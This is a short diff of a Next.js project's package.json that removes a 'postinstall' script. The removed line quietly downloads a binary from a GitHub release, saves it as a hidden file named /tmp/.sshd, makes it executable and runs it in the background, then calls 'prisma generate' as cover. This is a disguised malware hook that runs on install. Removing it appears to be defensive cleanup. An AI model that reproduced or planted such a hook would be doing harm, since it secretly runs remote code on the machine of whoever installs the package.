@@ -10,7 +10,6 @@
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd & && prisma generate",
     "vercel-build": "prisma migrate deploy && next build",
     "email": "email dev --dir ./components/emails --port 3001",
     "trigger:v3:dev": "npx trigger.dev@latest dev",
